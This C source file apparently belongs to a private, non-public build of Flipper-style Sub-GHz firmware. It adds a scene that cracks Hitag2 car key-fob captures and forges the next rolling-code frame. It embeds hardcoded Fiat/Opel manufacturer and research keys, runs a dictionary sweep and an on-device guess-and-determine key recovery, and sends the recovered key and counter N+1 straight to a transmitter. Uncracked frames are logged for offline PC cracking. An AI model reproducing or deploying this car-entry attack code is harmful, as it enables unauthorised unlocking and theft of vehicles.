#include "../subghz_i.h"
#include "../helpers/subghz_rollback.h"         // subghz_rollback_hex_after
#include "../helpers/subghz_hitag2_bf_dict.h"   // 89-key Fiat/BCM Hitag2 flash dict (L2)
#include "../helpers/subghz_hitag2_core.h"      // Fiat V1 u64 cipher + init-phase inversion
#include "../helpers/subghz_hitag2_hell.h"      // L5 Hitag2Hell guess-and-determine
#include <lib/subghz/protocols/hitag2.h>        // SUBGHZ_PROTOCOL_HITAG2_NAME
#include <lib/subghz/protocols/hitag2_cipher.h> // hitag2_recover_counter
#include <dialogs/dialogs.h>
#include <storage/storage.h>
#include <toolbox/hex.h>

// Hitag2 KEY-DICTIONARY brute (on-device, from a saved capture) — PRIVATE.
//
// A full 48-bit brute is infeasible on the ESP32 (2^48). What IS feasible: try a
// DICTIONARY of known/collected Hitag2 keys against the captured 32-bit keystream.
// For each key, hitag2_recover_counter() brute-forces the 18 unknown high counter
// bits (~2^18) and, on a match, simultaneously PROVES the key and recovers the full
// 28-bit counter. A dictionary hit -> forge the next frame (like the known-key
// forge). A miss -> append the frame to /ext/subghz/hitag2_frames.csv so the frames
// from one fob can be run through the offline PC guess-and-determine cracker.
//
// Dictionary = 8 compiled defaults + any 12-hex-digit keys (one per line, '#'
// comments) in /ext/subghz/assets/hitag2_keys, so the user can grow it.
// Reachable from the Car Keys hub.

#ifndef PUBLIC_BUILD

#define TAG "SubGhzSceneHitag2Crack"

#define HT2_EPOCH_SEARCH   256U   // low-10 counter -> search 8 high epoch bits
#define HT2_KEYS_FILE      EXT_PATH("subghz/assets/hitag2_keys")
#define HT2_FRAMES_FILE    EXT_PATH("subghz/hitag2_frames.csv")
#define HT2_MAX_EXT_KEYS   256U    // cap the loadable dictionary (RAM budget)
#define HT2_COMPILED_KEYS  13U

// 8 Fiat/factory RKE keys (mirror lib/subghz/protocols/fiat_v1.c) + published
// community keys harvested 2026-09-05 (MIKRON transponder byte-order, "Gone in
// 360 Seconds" research key, Opel Astra H recovered unit key, all-0 / all-F).
static const uint8_t s_ht2_default_keys[HT2_COMPILED_KEYS][6] = {
    {0xB7, 0x92, 0x80, 0xAE, 0xCC, 0x37}, {0xD4, 0x24, 0x28, 0xF7, 0xD9, 0x66},
    {0x4D, 0x34, 0x3F, 0xD4, 0xE7, 0xB6}, {0x6D, 0x6B, 0xF2, 0x1D, 0x3A, 0x1A},
    {0xA3, 0xF3, 0xAC, 0xF7, 0xB9, 0x10}, {0x4D, 0x49, 0x4B, 0x52, 0x4F, 0x4E},
    {0xCD, 0x49, 0x4B, 0x52, 0x4F, 0x4E}, {0x33, 0xFA, 0x2F, 0xCD, 0xC3, 0x3B},
    {0x4F, 0x4E, 0x4D, 0x49, 0x4B, 0x52}, // MIKRON transponder byte-order (Proxmark)
    {0xFF, 0xFF, 0x81, 0x46, 0x32, 0xFF}, // "Gone in 360 Seconds" research key
    {0xA8, 0x2F, 0xBF, 0xAE, 0x3F, 0xE2}, // Opel Astra H RKE unit key (Verstegen 2018)
    {0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, // all-zero try-list
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // all-ones try-list
};

static struct {
    uint32_t uid;      // "Sn:"
    uint16_t lctr;     // low 10 bits of the counter ("Cnt:")
    uint8_t btn;       // 4-bit button id ("Btn:")
    uint32_t ks;       // 32-bit captured keystream ("Hop:")
    bool valid;        // a real Hitag2 capture was parsed
    uint8_t (*keys)[6]; // dictionary (compiled defaults + loaded), heap
    uint32_t nkeys;
    FuriThread* thread; // sweep worker; NULL when idle
    uint8_t found_key[6];
    uint64_t found_key64;
    uint32_t counter;   // recovered full 28-bit counter
    bool recovered;
    uint32_t tried;     // keys tried (worker output, for the result text)
    // --- L5 Hell (guess-and-determine) + progress/cancel shared with the GUI thread ---
    volatile bool cancel;         // set by on_exit / Back; polled by workers to abort fast
    volatile uint8_t pct;         // 0..100 progress for the popup
    volatile uint32_t hell_states;// Hell scalar states tested so far (progress subtitle)
    bool hell_phase;              // true while the Hell worker (not the dict sweep) runs
    bool hell_second;             // true if a 2nd same-uid capture disambiguated the key
    uint32_t hell_cand;           // uid-consistent candidate keys seen during inversion
    // 2nd capture (different button/counter, same uid) used to disambiguate Hell hits
    bool have2;
    uint8_t btn2;
    uint16_t lctr2;
    uint32_t ks2;
} s_htc;

static uint64_t ht2_key64(const uint8_t k[6]) {
    uint64_t v = 0;
    for(int i = 0; i < 6; i++) v = (v << 8) | k[i];
    return v;
}

// Build the dictionary: compiled defaults first, then /ext keys (deduped-ish by
// simple append; harmless duplicates only cost extra cipher runs). Never fails —
// a missing/garbage file just leaves the 8 defaults.
static void ht2_load_dictionary(void) {
    s_htc.nkeys = 0;
    uint32_t flash_n = subghz_hitag2_bf_flash_dict_size();
    s_htc.keys = malloc(sizeof(uint8_t[6]) * (HT2_COMPILED_KEYS + flash_n + HT2_MAX_EXT_KEYS));
    if(!s_htc.keys) return;
    for(uint32_t i = 0; i < HT2_COMPILED_KEYS; i++) {
        memcpy(s_htc.keys[s_htc.nkeys++], s_ht2_default_keys[i], 6);
    }
    // L2: append the 89-key embedded Fiat/BCM flash dictionary, skipping any key
    // already present (compiled defaults overlap it on MIKRON/all-zero/all-ones).
    for(uint32_t i = 0; i < flash_n; i++) {
        const uint8_t(*fk)[6] = subghz_hitag2_bf_flash_dict_get(i);
        if(!fk) continue;
        bool dup = false;
        for(uint32_t j = 0; j < s_htc.nkeys && !dup; j++) {
            if(memcmp(s_htc.keys[j], *fk, 6) == 0) dup = true;
        }
        if(!dup) memcpy(s_htc.keys[s_htc.nkeys++], *fk, 6);
    }
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(storage);
    if(storage_file_open(f, HT2_KEYS_FILE, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char line[32];
        uint8_t li = 0;
        char ch;
        while(s_htc.nkeys < HT2_COMPILED_KEYS + flash_n + HT2_MAX_EXT_KEYS &&
              storage_file_read(f, &ch, 1) == 1) {
            if(ch == '\n' || ch == '\r') {
                line[li] = '\0';
                // parse a 12-hex-digit key, skipping '#' comment / blank lines
                if(li >= 12 && line[0] != '#') {
                    uint8_t key[6];
                    bool ok = true;
                    for(int b = 0; b < 6 && ok; b++) {
                        if(!hex_char_to_uint8(line[b * 2], line[b * 2 + 1], &key[b])) ok = false;
                    }
                    if(ok) memcpy(s_htc.keys[s_htc.nkeys++], key, 6);
                }
                li = 0;
            } else if(li < sizeof(line) - 1) {
                line[li++] = ch;
            }
        }
    }
    storage_file_close(f);
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
}

// Off-UI sweep: for each dictionary key run the 2^18 counter recovery; stop at the
// first key that reproduces the captured keystream. Same thread pattern as the
// known-key forge worker (heavy loop off the GUI thread, custom event on done).
static int32_t subghz_scene_hitag2_crack_worker(void* context) {
    SubGhz* subghz = context;
    s_htc.recovered = false;
    s_htc.tried = 0;
    for(uint32_t i = 0; i < s_htc.nkeys && !s_htc.cancel; i++) {
        s_htc.tried++;
        s_htc.pct = (uint8_t)((i * 100u) / (s_htc.nkeys ? s_htc.nkeys : 1u));
        view_dispatcher_send_custom_event(
            subghz->view_dispatcher, SubGhzCustomEventSceneHitag2CrackProgress);
        uint64_t k64 = ht2_key64(s_htc.keys[i]);
        uint32_t counter = 0;
        if(hitag2_recover_counter(k64, s_htc.uid, s_htc.lctr, s_htc.btn, s_htc.ks, &counter)) {
            memcpy(s_htc.found_key, s_htc.keys[i], 6);
            s_htc.found_key64 = k64;
            s_htc.counter = counter;
            s_htc.recovered = true;
            break;
        }
    }
    view_dispatcher_send_custom_event(
        subghz->view_dispatcher, SubGhzCustomEventSceneHitag2CrackDone);
    return 0;
}

// ---- L5: Hitag2Hell (guess-and-determine) -----------------------------------
//
// When no dictionary key matches, the 32-bit authenticator can still be attacked
// directly: Hitag2Hell recovers the state31 (state at the start of the output
// phase) from the observed authenticator, then hitag2_fiat_invert_init() rolls the
// 32 init rounds back to the 48-bit key. A single 32-bit authenticator is
// under-constrained (~2^16 spurious keys), so a UNIQUE key requires a SECOND
// capture of the same fob (different button/counter). Without one, we report the
// state31 candidate count and ask for another press. The full L0 sweep is a
// multi-HOUR compute on-device; Back cancels it (s_htc.cancel, polled here and in
// the progress callback). The offline PC cracker (frames.csv) remains the fast path.

// Progress callback (runs on the worker thread). Stores pct/states and pokes the
// GUI thread; returns false to abort when the user pressed Back.
static bool ht2_hell_progress(uint8_t pct, uint64_t states_tested, void* ctx) {
    SubGhz* subghz = ctx;
    s_htc.pct = pct;
    s_htc.hell_states = (uint32_t)states_tested;
    view_dispatcher_send_custom_event(
        subghz->view_dispatcher, SubGhzCustomEventSceneHitag2CrackProgress);
    return !s_htc.cancel;
}

// Pull a SECOND same-uid capture (different button or counter) out of the offline
// frames.csv log, to disambiguate Hell's candidate keys. Best-effort; leaves
// s_htc.have2 == false if no distinct row exists. Line format written by
// ht2_log_frame_for_crack(): "uid,button,counter10,keystream32" (all hex).
static void ht2_load_second_capture(void) {
    s_htc.have2 = false;
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(storage);
    if(storage_file_open(f, HT2_FRAMES_FILE, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char line[80];
        uint16_t li = 0;
        char ch;
        while(!s_htc.have2 && storage_file_read(f, &ch, 1) == 1) {
            if(ch == '\n' || ch == '\r') {
                line[li] = '\0';
                li = 0;
                if(line[0] == 'u' || line[0] == '#' || line[0] == '\0') continue; // header/blank
                unsigned uid = 0, btn = 0, cnt = 0, ks = 0;
                if(sscanf(line, "%x,%x,%x,%x", &uid, &btn, &cnt, &ks) == 4) {
                    // Same fob, but a genuinely different frame (else it can't constrain).
                    if((uint32_t)uid == s_htc.uid &&
                       ((uint8_t)btn != s_htc.btn ||
                        (uint16_t)(cnt & 0x03FFu) != s_htc.lctr ||
                        (uint32_t)ks != s_htc.ks)) {
                        s_htc.btn2 = (uint8_t)btn;
                        s_htc.lctr2 = (uint16_t)(cnt & 0x03FFu);
                        s_htc.ks2 = (uint32_t)ks;
                        s_htc.have2 = true;
                    }
                }
            } else if(li < sizeof(line) - 1) {
                line[li++] = ch;
            }
        }
    }
    storage_file_close(f);
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
}

static int32_t subghz_scene_hitag2_hell_worker(void* context) {
    SubGhz* subghz = context;
    s_htc.recovered = false;
    s_htc.hell_cand = 0;
    s_htc.hell_second = false;

    Hitag2HellConfig cfg = {0};
    cfg.progress_cb = ht2_hell_progress;
    cfg.progress_ctx = subghz;
    cfg.now_ms_cb = furi_get_tick;
    cfg.timeout_ms = 0; // no hard timeout; Back cancels via s_htc.cancel
    cfg.l0_start = 0;
    cfg.l0_end = 0; // full 2^20 sweep

    Hitag2HellResult* res = malloc(sizeof(Hitag2HellResult));
    if(res) {
        memset(res, 0, sizeof(*res));
        hitag2_hell_recover(s_htc.ks, &cfg, res);

        // Without a 2nd capture we can only report the state31 candidate count —
        // any uid-consistent key reproduces a single authenticator, so forging one
        // would be a guess. With a 2nd capture, keep the unique key that explains both.
        if(s_htc.have2) {
            for(uint32_t c = 0; c < res->candidate_count && !s_htc.recovered && !s_htc.cancel;
                c++) {
                Hitag2State st = res->candidates[c];
                for(uint32_t hi = 0; hi < (1u << 18) && !s_htc.cancel; hi++) {
                    uint8_t key[6];
                    if(!hitag2_fiat_invert_init(st, s_htc.uid, s_htc.btn, s_htc.lctr, hi, key))
                        continue;
                    s_htc.hell_cand++;
                    // Capture 1 is reproduced by construction; capture 2 (unknown
                    // epoch) is the real filter — reuse the counter search as validator.
                    uint32_t c2 = 0;
                    if(!hitag2_recover_counter(
                           ht2_key64(key), s_htc.uid, s_htc.lctr2, s_htc.btn2, s_htc.ks2, &c2))
                        continue;
                    memcpy(s_htc.found_key, key, 6);
                    s_htc.found_key64 = ht2_key64(key);
                    s_htc.counter = (hi << 10) | (uint32_t)(s_htc.lctr & 0x03FFu);
                    s_htc.hell_second = true;
                    s_htc.recovered = true;
                    break;
                }
            }
        } else {
            s_htc.hell_cand = res->candidate_count;
        }
        free(res);
    }

    view_dispatcher_send_custom_event(
        subghz->view_dispatcher, SubGhzCustomEventSceneHitag2HellDone);
    return 0;
}

// Append the captured frame to /ext/subghz/hitag2_frames.csv (uid,btn,cnt,ks) for
// the offline PC cracker. Best-effort; header written if the file is new.
static bool ht2_log_frame_for_crack(void) {
    // Append "uid,button,counter10,keystream32" for the offline PC cracker. A
    // fresh file gets the header first (size 0 == new). Best-effort.
    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* f = storage_file_alloc(storage);
    bool ok = storage_file_open(f, HT2_FRAMES_FILE, FSAM_WRITE, FSOM_OPEN_APPEND);
    if(ok) {
        char buf[80];
        int n;
        if(storage_file_size(f) == 0) {
            n = snprintf(buf, sizeof(buf), "uid,button,counter10,keystream32\n");
            storage_file_write(f, buf, n);
        }
        n = snprintf(
            buf,
            sizeof(buf),
            "%08lX,%X,%03X,%08lX\n",
            (unsigned long)s_htc.uid,
            s_htc.btn,
            s_htc.lctr,
            (unsigned long)s_htc.ks);
        ok = (storage_file_write(f, buf, n) == (size_t)n);
    }
    storage_file_close(f);
    storage_file_free(f);
    furi_record_close(RECORD_STORAGE);
    return ok;
}

void subghz_scene_hitag2_crack_on_enter(void* context) {
    SubGhz* subghz = context;
    memset(&s_htc, 0, sizeof(s_htc));

    // Pick a saved Hitag2 capture.
    FuriString* path = furi_string_alloc();
    FuriString* folder = furi_string_alloc_set(SUBGHZ_APP_FOLDER);
    DialogsFileBrowserOptions opts;
    dialog_file_browser_set_basic_options(&opts, SUBGHZ_APP_FILENAME_EXTENSION, &I_sub1_10px);
    bool picked = dialog_file_browser_show(subghz->dialogs, path, folder, &opts);
    furi_string_free(folder);

    if(picked && subghz_key_load(subghz, furi_string_get_cstr(path), false)) {
        SubGhzProtocolDecoderBase* decoder = subghz_txrx_get_decoder(subghz->txrx);
        if(decoder && decoder->protocol && decoder->protocol->name &&
           strcmp(decoder->protocol->name, SUBGHZ_PROTOCOL_HITAG2_NAME) == 0) {
            FuriString* text = furi_string_alloc();
            subghz_protocol_decoder_base_get_string(decoder, text);
            const char* t = furi_string_get_cstr(text);
            s_htc.uid = subghz_rollback_hex_after(t, "Sn:");
            s_htc.btn = (uint8_t)subghz_rollback_hex_after(t, "Btn:");
            s_htc.lctr = (uint16_t)(subghz_rollback_hex_after(t, "Cnt:") & 0x03FFu);
            s_htc.ks = subghz_rollback_hex_after(t, "Hop:");
            s_htc.valid = (s_htc.uid != 0);
            furi_string_free(text);
        }
    }
    furi_string_free(path);

    if(!s_htc.valid) {
        furi_string_set(
            subghz->error_str, "Pick a saved\nHitag2 capture\n(Fiat V1 etc.)");
        scene_manager_next_scene(subghz->scene_manager, SubGhzSceneShowError);
        return;
    }

    ht2_load_dictionary();

    Popup* popup = subghz->popup;
    popup_reset(popup);
    popup_set_header(popup, "Cracking", 63, 6, AlignCenter, AlignTop);
    {
        static char sub[32];
        snprintf(sub, sizeof(sub), "%lu keys x 2^18", (unsigned long)s_htc.nkeys);
        popup_set_text(popup, sub, 63, 30, AlignCenter, AlignCenter);
    }
    view_dispatcher_switch_to_view(subghz->view_dispatcher, SubGhzViewIdPopup);

    s_htc.thread = furi_thread_alloc();
    furi_thread_set_name(s_htc.thread, "Hitag2CrackWorker");
    furi_thread_set_stack_size(s_htc.thread, 2048);
    furi_thread_set_context(s_htc.thread, subghz);
    furi_thread_set_callback(s_htc.thread, subghz_scene_hitag2_crack_worker);
    furi_thread_start(s_htc.thread);
}

// Forge the NEXT frame from a recovered (key, counter) and jump to the transmitter.
// Shared by the dictionary sweep and the L5 Hell paths.
static void ht2_forge_next_and_show(SubGhz* subghz) {
    FURI_LOG_I(
        TAG,
        "Hitag2 crack: UID=%08lX key=%02X%02X%02X%02X%02X%02X counter=%07lX%s",
        (unsigned long)s_htc.uid,
        s_htc.found_key[0], s_htc.found_key[1], s_htc.found_key[2], s_htc.found_key[3],
        s_htc.found_key[4], s_htc.found_key[5], (unsigned long)s_htc.counter,
        s_htc.hell_second ? " (Hell L5)" : "");

    // counter N+1 lands in the receiver's forward window.
    uint32_t forge_counter = (s_htc.counter + 1u) & 0x0FFFFFFFu;
    SubGhzProtocolDecoderBase* decoder = subghz_txrx_get_decoder(subghz->txrx);
    bool ok = (decoder && decoder->protocol);
    SubGhzRadioPreset preset = subghz_txrx_get_preset(subghz->txrx);
    FlipperFormat* ff = flipper_format_string_alloc();
    if(ok) {
        ok = (subghz_protocol_decoder_base_serialize(decoder, ff, &preset) ==
              SubGhzProtocolStatusOk);
    }
    if(ok) {
        ok = flipper_format_write_hex(ff, "Hitag2Key", s_htc.found_key, 6) &&
             flipper_format_write_uint32(ff, "Counter", &forge_counter, 1);
    }
    if(ok) {
        FuriString* p = furi_string_alloc();
        furi_string_printf(
            p, "%s/garage/hitag2_%08lX.sub", SUBGHZ_APP_FOLDER, (unsigned long)s_htc.uid);
        ok = subghz_save_protocol_to_file(subghz, ff, furi_string_get_cstr(p)) &&
             subghz_key_load(subghz, furi_string_get_cstr(p), false);
        furi_string_free(p);
    }
    flipper_format_free(ff);

    if(ok) {
        scene_manager_next_scene(subghz->scene_manager, SubGhzSceneTransmitter);
    } else {
        furi_string_set(subghz->error_str, "Key found but\nforge save failed.");
        scene_manager_next_scene(subghz->scene_manager, SubGhzSceneShowError);
    }
}

// Launch the L5 Hell worker (heavy background thread). Assumes the dict thread and
// dictionary are already freed. Switches the popup to the Hell progress view.
static void ht2_start_hell(SubGhz* subghz) {
    ht2_load_second_capture();
    s_htc.hell_phase = true;
    s_htc.pct = 0;
    s_htc.hell_states = 0;
    Popup* popup = subghz->popup;
    popup_reset(popup);
    popup_set_header(popup, "Hell L5", 63, 6, AlignCenter, AlignTop);
    popup_set_text(
        popup,
        s_htc.have2 ? "starting (hours)\nBack = stop" : "1 capture: IDs only\nBack = stop",
        63, 34, AlignCenter, AlignCenter);
    view_dispatcher_switch_to_view(subghz->view_dispatcher, SubGhzViewIdPopup);

    s_htc.thread = furi_thread_alloc();
    furi_thread_set_name(s_htc.thread, "Hitag2HellWorker");
    furi_thread_set_stack_size(s_htc.thread, 4096);
    furi_thread_set_context(s_htc.thread, subghz);
    furi_thread_set_callback(s_htc.thread, subghz_scene_hitag2_hell_worker);
    furi_thread_start(s_htc.thread);
}

bool subghz_scene_hitag2_crack_on_event(void* context, SceneManagerEvent event) {
    SubGhz* subghz = context;
    bool consumed = false;
    if(event.type != SceneManagerEventTypeCustom) return false;

    // Progress tick from either worker — refresh the popup subtitle (GUI thread).
    if(event.event == SubGhzCustomEventSceneHitag2CrackProgress) {
        static char sub[40];
        if(s_htc.hell_phase) {
            snprintf(sub, sizeof(sub), "Hell %u%%  Back=stop", (unsigned)s_htc.pct);
        } else {
            snprintf(
                sub, sizeof(sub), "Dict %u%% (%lu/%lu)", (unsigned)s_htc.pct,
                (unsigned long)s_htc.tried, (unsigned long)s_htc.nkeys);
        }
        popup_set_text(subghz->popup, sub, 63, 34, AlignCenter, AlignCenter);
        return true;
    }

    // Dictionary sweep finished.
    if(event.event == SubGhzCustomEventSceneHitag2CrackDone) {
        consumed = true;
        if(s_htc.thread) {
            furi_thread_join(s_htc.thread);
            furi_thread_free(s_htc.thread);
            s_htc.thread = NULL;
        }
        if(s_htc.keys) {
            free(s_htc.keys);
            s_htc.keys = NULL;
        }

        if(s_htc.recovered) {
            ht2_forge_next_and_show(subghz);
            return consumed;
        }
        if(s_htc.cancel) { // user backed out during the sweep
            furi_string_printf(
                subghz->error_str, "Cancelled\n(%lu keys tried).", (unsigned long)s_htc.tried);
            scene_manager_next_scene(subghz->scene_manager, SubGhzSceneShowError);
            return consumed;
        }

        // Dict miss: log the frame for the PC cracker, then offer on-device L5 Hell.
        ht2_log_frame_for_crack();
        DialogMessage* m = dialog_message_alloc();
        dialog_message_set_header(m, "Hitag2 dict miss", 63, 2, AlignCenter, AlignTop);
        dialog_message_set_text(
            m,
            "Key not in 89-key dict.\nRun on-device Hell?\n(hours; needs 2 caps)",
            63, 30, AlignCenter, AlignCenter);
        dialog_message_set_buttons(m, "PC log", NULL, "Hell");
        DialogMessageButton b = dialog_message_show(subghz->dialogs, m);
        dialog_message_free(m);

        if(b == DialogMessageButtonRight) {
            ht2_start_hell(subghz);
        } else {
            furi_string_set(subghz->error_str, "Frame logged for\nPC crack (frames.csv).");
            scene_manager_next_scene(subghz->scene_manager, SubGhzSceneShowError);
        }
        return consumed;
    }

    // L5 Hell finished (or was cancelled).
    if(event.event == SubGhzCustomEventSceneHitag2HellDone) {
        consumed = true;
        if(s_htc.thread) {
            furi_thread_join(s_htc.thread);
            furi_thread_free(s_htc.thread);
            s_htc.thread = NULL;
        }
        if(s_htc.recovered) {
            ht2_forge_next_and_show(subghz);
            return consumed;
        }
        if(s_htc.cancel) {
            furi_string_printf(
                subghz->error_str, "Hell cancelled.\n%lu candidates.",
                (unsigned long)s_htc.hell_cand);
        } else if(s_htc.have2) {
            furi_string_printf(
                subghz->error_str,
                "Hell: no key from\n%lu candidates.\nTry more captures.",
                (unsigned long)s_htc.hell_cand);
        } else {
            furi_string_printf(
                subghz->error_str,
                "Hell: %lu state cand.\nCapture a 2nd press\nof this fob, retry.",
                (unsigned long)s_htc.hell_cand);
        }
        scene_manager_next_scene(subghz->scene_manager, SubGhzSceneShowError);
        return consumed;
    }

    return consumed;
}

void subghz_scene_hitag2_crack_on_exit(void* context) {
    SubGhz* subghz = context;
    UNUSED(subghz);
    // Signal any running worker (esp. the multi-hour Hell sweep) to abort, so the
    // join below returns promptly instead of blocking the UI on Back.
    s_htc.cancel = true;
    if(s_htc.thread) {
        furi_thread_join(s_htc.thread);
        furi_thread_free(s_htc.thread);
        s_htc.thread = NULL;
    }
    if(s_htc.keys) {
        free(s_htc.keys);
        s_htc.keys = NULL;
    }
    popup_reset(subghz->popup);
}

#else /* PUBLIC_BUILD — private car-attack surface only */

void subghz_scene_hitag2_crack_on_enter(void* context) {
    UNUSED(context);
}
bool subghz_scene_hitag2_crack_on_event(void* context, SceneManagerEvent event) {
    UNUSED(context);
    UNUSED(event);
    return false;
}
void subghz_scene_hitag2_crack_on_exit(void* context) {
    UNUSED(context);
}

#endif
